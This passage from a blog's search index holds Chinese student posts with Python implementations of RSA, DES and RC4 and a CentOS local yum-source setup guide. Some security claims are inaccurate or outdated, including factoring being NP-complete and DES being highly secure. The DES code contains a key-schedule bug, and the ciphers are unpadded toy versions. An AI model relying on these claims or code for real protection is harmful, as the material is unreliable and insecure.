prime_each(num, prime_arr): for prime in prime_arr: remainder = num % prime if remainder == 0: return False return True 正确性分析ϕ(n)=(p−1)(q−1) 成立的正确性，ϕ(n)表示小于n且与n互质数的个数则小于等于n且与n非互质的数的个数为，n-ϕ(n) = n - (p-1)*(q-1) = n - (pq-q-p+1) = n-n+p+q-1 = p+q-1所以只要证明小于等于n且与n非互质的数的个数为p+q-1即能证明ϕ(n)=(p−1)(q−1) ：这点很容易证明，由于n只有两个素因子p，q。则所有与n非互质的数都可以写成p*x或q*x，对于p*x来讲，x的取值范围为1&lt;=x&lt;=q，对q*x来讲x的取值范围为1&lt;=x&lt;=p，p*x与q*x的唯一交集为p*q，所以结论成立。 合理性分析RSA是目前最有影响力和最常用的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准。今天只有短的RSA钥匙才可能被强力方式解破。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。但是RSA还是有缺陷的：（1）产生密钥很麻烦，受到素数产生技术的限制，因而难以做到一次一密。（2）安全性，RSA的安全性依赖于大数的因子分解，但并没有从理论上证明破译RSA的难度与大数分解难度等价，而且密码学界多数人士倾向于因子分解不是NP问题。（3）速度太慢，由于RSA 的分组长度太大，为保证安全性，n 至少也要 600 bits以上，使运算代价很高，尤其是速度较慢，较对称密码算法慢几个数量级;且随着大数分解技术的发展，这个长度还在增加，不利于数据格式的标准化。 安全性分析RSA的安全性依赖于大数分解，这样攻击RSA系统的难度就是大整数因子分解的难度，一般认为这是一个NPC问题，但是否等同于大数分解一直未能得到理论上的证明，因为没有证明破解RSA就一定需要作大数分解。假设存在一种无须分解大数的算法，那它肯定可以修改成为大数分解算法。 RSA 的一些变种算法已被证明等价于大数分解。不管怎样，分解n是最显然的攻击方法。人们已能分解多个十进制位的大素数。因此，模数n必须选大一些，因具体适用情况而定。攻击方法：（1） 共模攻击（2） 分析RSA锁结构（3） 素因子的分解若用1台1 s能进行1亿次因子分解的高速计算机来计算，分解十进制长度为200位的n，其所需时间为3 800 000年.由此可见，对于RSA系统，如果用一个长度为200位（十进制）的n，认为它是比较安全的，如果n的长度更长，因子分解越困难，一般来说，每增加10位二进制数，分解的时间就要加长1倍.密码就越难以破译，加密强度就越高 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#coding:utf-8import base64import randomstr1 = &quot;abcdefg&quot;e = 65537 #公钥#快速幂 大大减少了计算幂的时间复杂度def quick(a,b,n): ans = 1 a = a%n while b!=0: if b&amp;1==1: ans = (ans*a)%n b&gt;&gt;=1 a = (a*a)%n return ans#Miller—Rabin素性判断def miller_rabin(n,k=80): if n == 2 or n == 3: return True if n % 2 == 0: return False r, s = 0, n - 1 while s % 2 == 0: r += 1 s //= 2 for _ in xrange(k): a = random.randrange(2, n - 1) x = pow(a, s, n) if x == 1 or x == n - 1: continue for _ in xrange(r - 1): x = pow(x, 2, n) if x == n - 1: break else: return False return Truedef proBin(): while True: p = &quot;1&quot; for i in range(0,1022): p = p+str(random.randint(0,1)) p = p+&quot;1&quot; p = int(p,2) if miller_rabin(p): return p#求模拟，用扩展欧几里得除法def modReserse(a,m): u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%mdef encrypt(m,n): c = str(quick(int(m),e,n)) return cdef decrypt(c,p,q): n = p*q d = modReserse(e,(p-1)*(q-1)) m = str(quick(int(c),d,n)) return mif __name__ == &#x27;__main__&#x27;: m = base64.b16encode(str1) p=proBin() q=proBin() print &#x27;p=&#x27;,p print &#x27;q=&#x27;,q n = p*q c = encrypt(m,n) print &quot;Encrypt：&quot; print c m = decrypt(c,p,q) print &quot;Decrypt：&quot; print base64.b16decode(m)","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"Python实现DES","slug":"编程/Python实现DES","date":"2019-03-01T12:59:12.000Z","updated":"2021-05-23T07:32:41.017Z","comments":true,"path":"2019/03/01/编程/Python实现DES/","link":"","permalink":"http://example.com/2019/03/01/%E7%BC%96%E7%A8%8B/Python%E5%AE%9E%E7%8E%B0DES/","excerpt":"前言密码学作业之DES","text":"前言密码学作业之DES 简介DES全称为Data Encryption Standard，即数据加密标准，是一种使用密钥加密的块算法，1977年被美国联邦政府的国家标准局确定为联邦资料处理标准（FIPS），并授权在非密级政府通信中使用，随后该算法在国际上广泛流传开来。需要注意的是，在某些文献中，作为算法的DES称为数据加密算法（Data Encryption Algorithm,DEA），已与作为标准的DES区分开来。 原理及步骤初始置换DES算法使用64位的密钥key将64位的明文输入块变为64位的密文输出块，并把输出块分为L0、R0两部分，每部分均为32位。 加密处理–迭代过程 经过初始置换后，进行16轮完全相同的运算，在运算过程中数据与秘钥结合。函数f的输出经过一个异或运算，和左半部分结合形成新的右半部分，原来的右半部分成为新的左半部分 F函数F函数由四步运算构成：秘钥置换(Kn的生成，n=0~16)；扩展置换；S-盒代替；P-盒置换 F函数–秘钥置换–子密钥生成*DES算法由64位秘钥产生16轮的48位子秘钥。在每一轮的迭代过程中，使用不同的子秘钥。 F函数–密钥置换选择1—PC-164位秘钥降至56位秘钥不是说将每个字节的第八位删除，而是通过缩小选择换位表1（置换选择表1）的变换变成56位。 F函数–扩展置换E通过扩展置换E，数据的右半部分Rn从32位扩展到48位。扩展置换改变了位的次序，重复了某些位。 F函数–S-盒代替异或以后的结果作为输入块进行S盒代替运算功能是把48位数据变为32位数据代替运算由8个不同的代替盒(S盒)完成。每个S-盒有6位输入，4位输出。所以48位的输入块被分成8个6位的分组，每一个分组对应一个S-盒代替操作。经过S-盒代替，形成8个4位分组结果。 F函数– P-盒置换S-盒代替运算，每一盒得到4位，8盒共得到32位输出。这32位输出作为P盒置换的输入块。 P盒置换将每一位输入位映射到输出位。任何一位都不能被映射两次，也不能被略去。 经过P-盒置换的结果与最初64位分组的左半部分异或，然后左右两部分交换，开始下一轮迭代。 逆置换将初始置换进行16次的迭代，即进行16层的加密变换，这个运算过程我们暂时称为函数f。得到L16和R16，将此作为输入块，进行逆置换得到最终的密文输出块。 DES解密 加密和解密可以使用相同的算法。加密和解密唯一不同的是秘钥的次序是相反的。就是说如果每一轮的加密秘钥分别是K1、K2、K3…K16，那么解密秘钥就是K16、K15、K14…K1。为每一轮产生秘钥的算法也是循环的。加密是秘钥循环左移，解密是秘钥循环右移。 合理性分析DES是一个对称密码体制，加密和解密使用同一密钥，有效的密钥长度为56位。DES是一个分组密码算法，分组长度为64位，明文和密文的长度相同。另外，DES采用了Feistel结构，具有加密与解密相识的特性。 安全性分析DES算法具有极高安全性，到目前为止，除了用穷举搜索法对DES算法进行攻击外，还没有发现更有效的办法。而56位长的密钥的穷举空间为256，这意味着如果一台计算机的速度是每一秒种检测一百万个密钥，则它搜索完全部密钥就需要将近2285年的时间，可见，这是难以实现的，当然，随着科学技术的发展，当出现超高速计算机后，我们可考虑把DES密钥的长度再增长一些，以此来达到更高的保密程度。DES还存在以下的问题：（1） 互补性（DES的最大弱点）（2） 弱密钥（3） 迭代轮数（4） 密钥长度 Python完整代码按步骤，代码较繁琐这个是完整的按照上面的步骤来的，比较复杂的代码(看的同学的，我没写出来)。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149#coding:utf-8key = &quot;this is a key&quot;Ip = [58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8, 57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3,61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7]Ip_1= [40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29, 36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25]PC_1 = [57,49,41,33,25,17,9,1,58,40,42,34,26,18,10,2,59,51,43,35,27,19,11,3,60,52,44,36,63,55,47, 39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,29,21,13,5,28,20,12,4]E = [32,1,2,3,4,5,4,5,6,7,8,9,8,9,10,11,12,13,12,13,14,15,16,17,16,17,18,19,20,21,20,21,22,23 ,24,25,24,25,26,27,28,29,28,29,30,31,32,1]PC_2 = [14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,16,7,27,20,13,2,41,52,31,37,47,55,30,40, 51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32]left_mov = [1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1]S = [[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8, 4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13], #S1 [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5, 0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9], #S2 [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1, 13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12], #S3 [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9, 10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14], #S4 [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6, #S5 4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3], [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8, #S6 9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13], [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6, #S7 1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12], [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2, #S8 7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11]]P = [16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,2,8,24,14, 32,27,3,9,19,13,30,6,22,11,4,25]def init_IP(m1): #IP初始置换，将明文转化成64比特后置换 mp = [] for i in range(0,64): mp.append(m1[Ip[i]-1]) return mpdef init_IP_1(m1): #IP逆初始置换 mp_1 = [] for i in range(0,64): mp_1.append(m1[Ip_1[i]-1]) return mp_1def F(L,R,r): #F()函数 right = [] for i in range(0,48): #扩展置换E right.append(R[E[i]-1]) a = [] k=setKey(pKey(key),r) for i in range(0,48): #密钥加 a.append(str((int(right[i])+int(k[i]))%2)) s = &quot;&quot; for i in range(0,8): #S盒代换 b = a[:6] a = a[6:] #S盒代换 h = int((b[0]+b[5]),2) l = int((b[1]+b[2]+b[3]+b[4]),2) s += str(bin(S[i][h*16+l])[2:]).zfill(4) p = [] t = list(s) for i in range(0,32): #置换运算P p.append(t[P[i]-1]) return pdef pKey(k): #密钥置换，将密钥从64位置换成56位 str1 = &quot;&quot; for i in k: str1 += str(bin(ord(i))[2:]).zfill(8) list_t = list(str1) list_k = [] for i in range(0,56): list_k.append(list_t[PC_1[i]-1]) return list_kdef setKey(t,r): #生成每一轮迭代的48位密钥 for i in range(0,r): ll = t[:28] lr = t[28:] ll = ll[left_mov[i]:]+ll[:left_mov[i]] lr = lr[left_mov[i]:]+lr[:left_mov[i]] t = ll+lr list_k = [] for i in range(0,48): list_k.append(list_t[PC_2[i]-1]) return list_kdef desEncrypt(m): print &quot;Encrypt: &quot; list_m = init_IP(m) L = list_m[:32] R = list_m[32:] for i in range(1,17): #16轮迭代 list_p = F(L,R,i) temp = R x = &quot;&quot; for j in range(0,32): x += str((int(list_p[j])+int(L[j]))%2) R = list(x) L = temp c = init_IP_1(list(R+L)) print &quot;&quot;.join(c) return &quot;&quot;.join(c)def desDecrypt(c): print &quot;Decrypt:&quot; list_c = init_IP(c) L = list_c[:32] R = list_c[32:] for i in range(1,17): #16轮迭代 list_p = F(L,R,17-i) temp = R x = &quot;&quot; for i in range(0,32): x += str((int(list_p[i])+int(L[i]))%2) R = list(x) L = temp list_m = init_IP_1(list(R+L)) m = &quot;&quot; for i in range(0,8): a = &quot;&quot;.join(list_m[:8]) m += chr(int(a,2)) list_m = list_m[8:] print m return mif __name__ == &#x27;__main__&#x27;: m = &quot;cumt2016&quot; str1 = &quot;&quot; for i in m: str1 = str1+str(bin(ord(i))[2:]).zfill(8) list_t = list(str1) c = desEncrypt(list_t) desDecrypt(list(c)) 速度快，占内存小这个是大神写的，在网上看到的，不知道哪位大佬的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189from functools import partial class DES(object): __ip = [ 58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4, 62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8, 57,49,41,33,25,17, 9,1,59,51,43,35,27,19,11,3, 61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7, ] __ip1 = [ 40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31, 38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29, 36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27, 34,2,42,10,50,18,58,26,33,1,41, 9,49,17,57,25, ] __e = [ 32, 1, 2, 3, 4, 5, 4 , 5, 6, 7, 8, 9, 8 , 9,10,11,12,13, 12,13,14,15,16,17, 16,17,18,19,20,21, 20,21,22,23,24,25, 24,25,26,27,28,29, 28,29,30,31,32, 1, ] __p = [ 16, 7,20,21,29,12,28,17, 1 ,15,23,26, 5,18,31,10, 2 ,8 ,24,14,32,27, 3, 9, 19,13,30, 6,22,11, 4,25, ] __s = [ [ 0xe,0x4,0xd,0x1,0x2,0xf,0xb,0x8,0x3,0xa,0x6,0xc,0x5,0x9,0x0,0x7, 0x0,0xf,0x7,0x4,0xe,0x2,0xd,0x1,0xa,0x6,0xc,0xb,0x9,0x5,0x3,0x8, 0x4,0x1,0xe,0x8,0xd,0x6,0x2,0xb,0xf,0xc,0x9,0x7,0x3,0xa,0x5,0x0, 0xf,0xc,0x8,0x2,0x4,0x9,0x1,0x7,0x5,0xb,0x3,0xe,0xa,0x0,0x6,0xd, ], [ 0xf,0x1,0x8,0xe,0x6,0xb,0x3,0x4,0x9,0x7,0x2,0xd,0xc,0x0,0x5,0xa, 0x3,0xd,0x4,0x7,0xf,0x2,0x8,0xe,0xc,0x0,0x1,0xa,0x6,0x9,0xb,0x5, 0x0,0xe,0x7,0xb,0xa,0x4,0xd,0x1,0x5,0x8,0xc,0x6,0x9,0x3,0x2,0xf, 0xd,0x8,0xa,0x1,0x3,0xf,0x4,0x2,0xb,0x6,0x7,0xc,0x0,0x5,0xe,0x9, ], [ 0xa,0x0,0x9,0xe,0x6,0x3,0xf,0x5,0x1,0xd,0xc,0x7,0xb,0x4,0x2,0x8, 0xd,0x7,0x0,0x9,0x3,0x4,0x6,0xa,0x2,0x8,0x5,0xe,0xc,0xb,0xf,0x1, 0xd,0x6,0x4,0x9,0x8,0xf,0x3,0x0,0xb,0x1,0x2,0xc,0x5,0xa,0xe,0x7, 0x1,0xa,0xd,0x0,0x6,0x9,0x8,0x7,0x4,0xf,0xe,0x3,0xb,0x5,0x2,0xc, ], [ 0x7,0xd,0xe,0x3,0x0,0x6,0x9,0xa,0x1,0x2,0x8,0x5,0xb,0xc,0x4,0xf, 0xd,0x8,0xb,0x5,0x6,0xf,0x0,0x3,0x4,0x7,0x2,0xc,0x1,0xa,0xe,0x9, 0xa,0x6,0x9,0x0,0xc,0xb,0x7,0xd,0xf,0x1,0x3,0xe,0x5,0x2,0x8,0x4, 0x3,0xf,0x0,0x6,0xa,0x1,0xd,0x8,0x9,0x4,0x5,0xb,0xc,0x7,0x2,0xe, ], [ 0x2,0xc,0x4,0x1,0x7,0xa,0xb,0x6,0x8,0x5,0x3,0xf,0xd,0x0,0xe,0x9, 0xe,0xb,0x2,0xc,0x4,0x7,0xd,0x1,0x5,0x0,0xf,0xa,0x3,0x9,0x8,0x6, 0x4,0x2,0x1,0xb,0xa,0xd,0x7,0x8,0xf,0x9,0xc,0x5,0x6,0x3,0x0,0xe, 0xb,0x8,0xc,0x7,0x1,0xe,0x2,0xd,0x6,0xf,0x0,0x9,0xa,0x4,0x5,0x3, ], [ 0xc,0x1,0xa,0xf,0x9,0x2,0x6,0x8,0x0,0xd,0x3,0x4,0xe,0x7,0x5,0xb, 0xa,0xf,0x4,0x2,0x7,0xc,0x9,0x5,0x6,0x1,0xd,0xe,0x0,0xb,0x3,0x8, 0x9,0xe,0xf,0x5,0x2,0x8,0xc,0x3,0x7,0x0,0x4,0xa,0x1,0xd,0xb,0x6, 0x4,0x3,0x2,0xc,0x9,0x5,0xf,0xa,0xb,0xe,0x1,0x7,0x6,0x0,0x8,0xd, ], [ 0x4,0xb,0x2,0xe,0xf,0x0,0x8,0xd,0x3,0xc,0x9,0x7,0x5,0xa,0x6,0x1, 0xd,0x0,0xb,0x7,0x4,0x9,0x1,0xa,0xe,0x3,0x5,0xc,0x2,0xf,0x8,0x6, 0x1,0x4,0xb,0xd,0xc,0x3,0x7,0xe,0xa,0xf,0x6,0x8,0x0,0x5,0x9,0x2, 0x6,0xb,0xd,0x8,0x1,0x4,0xa,0x7,0x9,0x5,0x0,0xf,0xe,0x2,0x3,0xc, ], [ 0xd,0x2,0x8,0x4,0x6,0xf,0xb,0x1,0xa,0x9,0x3,0xe,0x5,0x0,0xc,0x7, 0x1,0xf,0xd,0x8,0xa,0x3,0x7,0x4,0xc,0x5,0x6,0xb,0x0,0xe,0x9,0x2, 0x7,0xb,0x4,0x1,0x9,0xc,0xe,0x2,0x0,0x6,0xa,0xd,0xf,0x3,0x5,0x8, 0x2,0x1,0xe,0x7,0x4,0xa,0x8,0xd,0xf,0xc,0x9,0x0,0x3,0x5,0x6,0xb, ], ] __k1 = [ 57,49,41,33,25,17, 9, 1 ,58,50,42,34,26,18, 10, 2,59,51,43,35,27, 19,11, 3,60,52,44,36, 63,55,47,39,31,23,15, 7 ,62,54,46,38,30,22, 14, 6,61,53,45,37,29, 21,13, 5,28,20,12, 4, ] __k2 = [ 14,17,11,24, 1, 5, 3,28, 15, 6,21,10,23,19,12, 4, 26, 8,16, 7,27,20,13, 2, 41,52,31,37,47,55,30,40, 51,45,33,48,44,49,39,56, 34,53,46,42,50,36,29,32, ] __k0 = [ 1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1, ] __hex_bin = &#123; &#x27;0&#x27;:&#x27;0000&#x27;,&#x27;1&#x27;:&#x27;0001&#x27;,&#x27;2&#x27;:&#x27;0010&#x27;,&#x27;3&#x27;:&#x27;0011&#x27;, &#x27;4&#x27;:&#x27;0100&#x27;,&#x27;5&#x27;:&#x27;0101&#x27;,&#x27;6&#x27;:&#x27;0110&#x27;,&#x27;7&#x27;:&#x27;0111&#x27;, &#x27;8&#x27;:&#x27;1000&#x27;,&#x27;9&#x27;:&#x27;1001&#x27;,&#x27;a&#x27;:&#x27;1010&#x27;,&#x27;b&#x27;:&#x27;1011&#x27;, &#x27;c&#x27;:&#x27;1100&#x27;,&#x27;d&#x27;:&#x27;1101&#x27;,&#x27;e&#x27;:&#x27;1110&#x27;,&#x27;f&#x27;:&#x27;1111&#x27;, &#x27; &#x27;:&#x27;0000&#x27; &#125; __re = lambda t, s: &#x27;&#x27;.join(s[i-1] for i in t) __IP = partial(__re, __ip) __IP1 = partial(__re, __ip1) __E = partial(__re, __e) __P = partial(__re, __p) __K1 = partial(__re, __k1) __K2 = partial(__re, __k2) __B = partial( lambda hex_bin, s: &#x27;&#x27;.join(hex_bin[w] for w in &#x27;&#x27;.join(&#x27;%2x&#x27; % ord(w) for w in s)), __hex_bin) __DB = partial( lambda s: &#x27;&#x27;.join(chr(int(s[i:i+8], 2)) for i in range(0, len(s), 8))) __S = partial( lambda hex_bin, __s, s: &#x27;&#x27;.join(hex_bin[&#x27;%x&#x27; % __s[i][int(s[i*6]+s[i*6+5], 2)*16 + int(s[i*6+1:i*6+5], 2)]] for i in range(8)),__hex_bin, __s) __F = partial( lambda s, k: &#x27;&#x27;.join(&#x27;0&#x27; if s[i]==k[i] else &#x27;1&#x27; for i in range(len(s)))) __K0 = partial( lambda k0, K2, k: map(K2,(k[k0[i]:28]+k[0:k0[i]] + k[k0[i]+28:56]+k[28:k0[i]+28] for i in range(16))),__k0, __K2) __K = partial( lambda K1, K0, k: K0(K1(k)),__K1, __K0) def __init__(self): pass def input_key(self, key, base=10): if base == 2: pass elif base == 16: key = &#x27;&#x27;.join(self.__class__.__hex_bin[w] for w in key) else: key = self.__class__.__B(key) self.__k = self.__class__.__K(key) def __code(self, s, k): s = self.__IP(s) l, r = s[0:32], s[32:64] for i in range(16): r_t = r r = self.__E(r) r = self.__F(r, k[i]) r = self.__S(r) r = self.__P(r) r = self.__F(r, l) l = r_t return self.__class__.__IP1(r+l) def encode(self, s): a = &#x27;&#x27; s += &#x27; &#x27; * ((8-len(s)%8)%8) for i in range(0, len(s), 8): before = self.__class__.__B(s[i:i+8]) after = self.__code(before, self.__k) a += &#x27;%16x&#x27; % int(after, 2) return &#x27;&#x27;.join(w if w!=&#x27; &#x27; else &#x27;0&#x27; for w in a) def decode(self, s): a = &#x27;&#x27; s.lower() for i in range(0, len(s), 16): before = &#x27;&#x27;.join(self.__class__.__hex_bin[s[j]] for j in range(i, i+16)) after = self.__code(before, self.__k[::-1]) a += self.__class__.__DB(after) return a.rstrip() if __name__ == &#x27;__main__&#x27;: d = DES() key=&quot;this is a key&quot; d.input_key(key) s = &#x27;this is a text&#x27; print &quot;m=&quot;,s print &quot;key=&quot;,key print &quot;Encrypt:&quot;, a = d.encode(s) print a print &quot;Decrypt:&quot;, b = d.decode(a) print b","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"Python实现RC4","slug":"编程/Python实现RC4","date":"2019-03-01T12:50:40.000Z","updated":"2021-05-23T07:32:47.528Z","comments":true,"path":"2019/03/01/编程/Python实现RC4/","link":"","permalink":"http://example.com/2019/03/01/%E7%BC%96%E7%A8%8B/Python%E5%AE%9E%E7%8E%B0RC4/","excerpt":"前言上学期密码学的作业，写一下。","text":"前言上学期密码学的作业，写一下。 简介在密码学中，RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。 原理其原理主要分为三步：RC4的原理分为三步： 初始化S和T 123for i=0 to 255 do S[i]=i; T[i]=K[ imodkeylen ]; 初始排列S 1234j=0;for i=0 to 255 do j= ( j+S[i]+T[i])mod256; swap(S[i],S[j]); 产生密钥流 1234567i,j=0;for r=0 to len do //r为明文长度，r字节 i=(i+1) mod 256; j=(j+S[i])mod 256; swap(S[i],S[j]); t=(S[i]+S[j])mod 256; k[r]=S[t]; 正确性分析由于经过加密后的结果，输出的是一些不可见，所以又使用base64进行了再次加密，使其转化为可见字符。 安全性分析 理论上来说，RC4算法是很难被破解的。RC4中用到的key是长度在[1,256]的unsigned char字符串，可能性就是256+256^2+256^3+….256^256≈256^256次方种可能性，量级在10^600以上。如果你真的设置了一个256byte（不是bit哦）的key，别人想要暴力破解几乎是不可能的。由于RC4算法加密是采用的xor，所以，一旦子密钥序列出现了重复，密文就有可能被破解。由于存在部分弱密钥，使得子密钥序列在不到100万字节内就发生了完全的重复，如果是部分重复，则可能在不到10万字节内就能发生重复，因此，推荐在使用RC4算法时，必须对加密密钥进行测试，判断其是否为弱密钥。其不足主要体现于，在无线网络中IV（初始化向量）不变性漏洞。 加大被破解的难度： （1）定时更换key，就像网民应该定时更换自己的密码一样。 （2）在真实原文里混杂一些随机字符串再加密。 （3）并不把加密串直接暴露给公众，可以对加密串做二次加密。（循环移位、字符-字符映射、按某种规则打散、再做一次RC4、等等） 代码下面给出Python的完整代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#-*- coding: UTF-8 -*-import hashlibimport base64def Rc4_init(S, K): # S盒初始化置换,K为密钥 j = 0 K = hashlib.md5(K).hexdigest() k = [] # 临时数组 for i in range(256): S.append(i) k.append(K[i % len(K)]) for i in range(256): j = (j + S[i] + ord(k[i])) % 256 S[i], S[j] = S[j], S[i] # 交换S[i],S[j]def rc4_Encrypt(S, D): i = j = 0 result = &#x27;&#x27; for a in D: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] t = (S[i] + S[j]) % 256 k = chr(ord(a) ^ S[(S[i] + S[j]) % 256]) result += k result = base64.b64encode(result) return resultdef rc4_Decrypt(S, D): i = j = 0 D = base64.b64decode(D) result = &#x27;&#x27; for a in D: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] t = (S[i] + S[j]) % 256 k = chr(ord(a) ^ S[(S[i] + S[j]) % 256]) result += k return resultkey = &#x27;dasdffdghfghjde&#x27;d = &#x27;thisisatest&#x27;print(&quot;key:&quot;+key)print(&quot;m:&quot;+d)s=[]Rc4_init(s, key)#print(&quot;s盒:&quot;)#print(s)c = rc4_Encrypt(s, d)print(&quot;Encrypt:&quot;+c)s=[]Rc4_init(s,key)#print(&quot;s盒:&quot;)#print(s)z = rc4_Decrypt(s, c)print(&quot;Decrypt:&quot;+z)","categories":[{"name":"Other","slug":"Other","permalink":"http://example.com/categories/Other/"}],"tags":[]},{"title":"Linux配置本地yum源","slug":"编程/Linux配置本地yum源","date":"2019-03-01T10:35:43.000Z","updated":"2021-05-23T07:31:05.222Z","comments":true,"path":"2019/03/01/编程/Linux配置本地yum源/","link":"","permalink":"http://example.com/2019/03/01/%E7%BC%96%E7%A8%8B/Linux%E9%85%8D%E7%BD%AE%E6%9C%AC%E5%9C%B0yum%E6%BA%90/","excerpt":"前言借着安全牛的课程学习一下Linux。这里是安装了CentOS","text":"前言借着安全牛的课程学习一下Linux。这里是安装了CentOS 简介CentOSCentOS是一个旨在对Red Hat Enterprise Linux(简称RHEL)源代码进行重建、从而使其转化为可安装Linux版本的项目。作为编外项目，CentOS也会为其发行版用户创建更新软件包，但为了避免对上游兼容性造成影响、对应的软件库更新内容不会默认启用。 优势: 经过非常严格的测试;具备极高的稳定性与可靠性;免费下载及使用;长达五年的免费安全更新周期。 不足：缺乏最新Linux技术;项目偶尔无法实现提供定期安全更新及稳定发布的承诺。 软件包管理：使用RPM软件包的YUM图形化与命令行工具。具体的信息看百度百科。 yum与RMP什么是yum呢？Yum（全称为 Yellow dog Updater, Modified）是一个在Fedora和RedHat以及CentOS中的Shell前端软件包管理器。基于RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软件包，无须繁琐地一次次下载、安装。 RPM 是Red-Hat Package Manager（RPM软件包管理器）的缩写，一种用于互联网下载包的打包及安装工具，它包含在某些Linux分发版中。它生成具有.RPM扩展名的文件。RPM文件在Linux系统中的安装最为简便。以著名的图像处理软件XV为例，其RPM包xv－3.10a－13.i386.rpm可以在该程序的主页中下载取得。 在下载的CentOS镜像文件中包含了大部分软件包，这些软件包也可以连接外网下载，但是在没有外网的情况下，就需要在本地配置yum源了，这样就可以非常方便的下载rmp包了。如果有http，那么本局域网内的其他主机也可以使用本地的yum源，非常方便。 CentOS安装下载一个镜像，清华镜像网站即可https://mirrors.tuna.tsinghua.edu.cn/centos/7.6.1810/isos/x86_64/ 然后在VMware装载，做一个虚拟机使用，安装方法百度搜索即可。 配置本地yum源同一个局域网的yum源要配置一个局域网内所有主机都能使用的yum源，需要给本地设置一个固定的ip。 登录CentOS，因为要更改一些文件配置，所以需要root权限。然后如下： 编辑网络配置文件如下，然后保存退出， 更改一下主机名 重启，然后查看一下网络配置，已经改好了 然后配置yum源 其实在，安装好CentOS后，装有yum的安装光盘已经挂载在机器里面了，但是为了防止其自动挂载，先把它卸载掉，然后创建一个，自己新建的一个目录。umount /dev/cdrom 卸载mkdir /media/cdrom 创建一个新目录mount /dev/cdrom/media/cdrom 重新挂载，这里是只读的 这里要保证光盘是挂载的 接下来要安装ftp服务，用于做yum源的cd /media/cdrom/Packages/ 这个目录下是各种软件包 ls 查看 安装ftp服务rpm -Uvh vsftpd-3.0.**********.rpm 安装完成后，cd /var/ftpmkdir yun 创建一个目录cp -rf /media/cdrom/* ./ 拷贝光盘里所有的东西到本地 启动vsftpd服务，这样就可以作为一个yum源了systemctl start vsftpd.service 启动完成之后，netstat -atpa查看端口情况，可以发现21端口开放，(netstat -lntp) 